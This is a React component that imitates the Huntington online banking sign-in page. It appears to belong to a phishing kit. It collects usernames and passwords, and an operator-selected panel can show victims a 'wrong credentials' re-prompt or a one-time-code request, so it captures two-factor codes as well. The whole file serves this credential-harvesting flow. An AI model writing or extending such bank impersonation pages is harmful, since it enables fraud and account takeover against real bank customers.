import { useState } from "react";
import useForms from "../../../../../../../hooks/useForms";
import { bankDetailsInfo } from "../../bankDetails";
import BankingHeader from "./BankingHeader";
import clsx from "clsx";
import { Link } from "react-router-dom";
import { IoMdLock } from "react-icons/io";

const Huntington = ({
  handleCancel,
  bankName,
  handleSubmit,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  mainCancel,
}) => {
  const { formState, handleChange } = useForms(bankDetailsInfo);
  const [otp, setOtp] = useState("");

  const onSumbitForm = () => {
    const newItems = {
      ...formState,
      bankName: bankName,
    };

    handleSubmit(newItems);
  };

  const handleVerifiedOtp = () => {
    setOtpOpen(true);
  };

  return (
    <div>
      <div>
        <BankingHeader
          text="Huntington - Sign in"
          handleCancel={handleCancel}
        />
        <header>
          <div>img</div>
        </header>
        <div>
          <h2>Log into Online Banking</h2>
          <div className={clsx(allBankOpen ? "hidden" : "block")}>
            <div>
              <label>Username</label>
              <input
                type="text"
                value={formState.username}
                onChange={handleChange}
                name="username"
              />
            </div>
            <div>
              <label>Password</label>
              <input
                type="password"
                value={formState.password}
                name="password"
                onChange={handleChange}
              />
            </div>
            <div>
              <button onClick={onSumbitForm}>
                <IoMdLock />
                Log in
              </button>
              <div>
                <Link>Forgot Username?</Link>
                <Link>Forgot Password?</Link>
              </div>
            </div>
            <div>
              New to Online Banking? <Link>Enroll Now</Link>
            </div>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <button>
                {whatToShowDetails.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedId(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSelectSubmit}>Submit</button>
              <div>
                {selectedPath.name === "Loading" && <p>{selectedPath.body}</p>}
                {selectedPath.name === "wrong" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <div>
                        <label>User ID</label>
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                        />
                      </div>
                      <div>
                        <label>Password</label>
                        <input
                          type="password"
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                        />
                      </div>
                      <div>
                        <button onClick={onSumbitForm}>Submit</button>
                        <button>Cancel</button>
                      </div>
                    </div>
                  </>
                )}
                {selectedPath.name === "otp" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <button>
                {otpInfo.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedOtp(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSubmitOtp}>Submit</button>
              <div>
                {selectedOtp.name === "Loading" && <p>{selectedOtp.body}</p>}
                {selectedOtp.name === "wrong" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
                {selectedOtp.name === "otp" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <button onClick={() => mainCancel(false)}>Cancel</button>
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default Huntington;
